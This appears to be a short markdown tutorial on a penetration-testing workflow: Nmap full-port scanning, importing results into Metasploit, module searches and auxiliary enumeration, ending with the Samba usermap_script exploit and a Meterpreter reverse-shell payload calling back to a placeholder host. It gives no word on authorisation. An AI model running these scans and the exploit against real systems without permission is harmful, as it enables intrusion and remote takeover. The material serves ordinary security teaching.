# Typical workflow

- [Typical workflow](#typical-workflow)
  - [Simple example](#simple-example)
  - [Advanced example](#advanced-example)
    - [**Step 1 — Scan the network with Nmap**](#step-1--scan-the-network-with-nmap)
    - [**Step 2 — Import results into Metasploit**](#step-2--import-results-into-metasploit)
    - [**Step 3 — Search for vulnerabilities in Metasploit**](#step-3--search-for-vulnerabilities-in-metasploit)
    - [**Step 4 — Run targeted enumeration in Metasploit**](#step-4--run-targeted-enumeration-in-metasploit)
    - [**Step 5 — Exploit**](#step-5--exploit)
    - [**Key idea**](#key-idea)


## Simple example

1. Nmap first — map the terrain:

```sh
nmap -p- -sV -oX scan.xml target
```

2. Import into Metasploit:
```sh
msfconsole
db_import scan.xml
services
```

3. Switch to Metasploit for targeted vuln checks and exploitation.

```sh
msfconsole
```

## Advanced example

Alright — here’s a clean, repeatable **Nmap → Metasploit workflow** you can run every time you start looking at a new target.

---

### **Step 1 — Scan the network with Nmap**

Start wide, then go deep.

**Full TCP port sweep with service/version detection + useful NSE scripts:**

```bash
nmap -p- -sV -sC -oX scan.xml TARGET_IP
```

* `-p-` → scan all 65535 TCP ports
* `-sV` → detect service + version
* `-sC` → run “default” safe scripts (banner grabs, basic enumeration)
* `-oX scan.xml` → save results in XML for Metasploit import

---

### **Step 2 — Import results into Metasploit**

```bash
msfconsole
db_import scan.xml
services
hosts
```

* `services` → list open ports + versions
* `hosts` → list discovered hosts
* Now you have a searchable database in Metasploit

---

### **Step 3 — Search for vulnerabilities in Metasploit**

Example:

```bash
search type:exploit name:vsftpd
search type:auxiliary name:smb
```

or:

```bash
vulns
```

(if you’ve run vuln-checking modules)

---

### **Step 4 — Run targeted enumeration in Metasploit**

Metasploit has **auxiliary** scanner modules for deep checks, e.g.:

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS TARGET_IP
run
```

```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS TARGET_IP
run
```

These confirm service details found by Nmap and sometimes reveal extra info.

---

### **Step 5 — Exploit**

Once you’ve confirmed a vulnerability:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS TARGET_IP
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST YOUR_IP
run
```

And you’ve got your shell (if successful).

---

### **Key idea**

* **Nmap** = fast, broad, detailed recon.
* **Metasploit** = store, organize, confirm, and exploit.
* The handoff is smooth because you import Nmap results — no need to rescan in Metasploit.
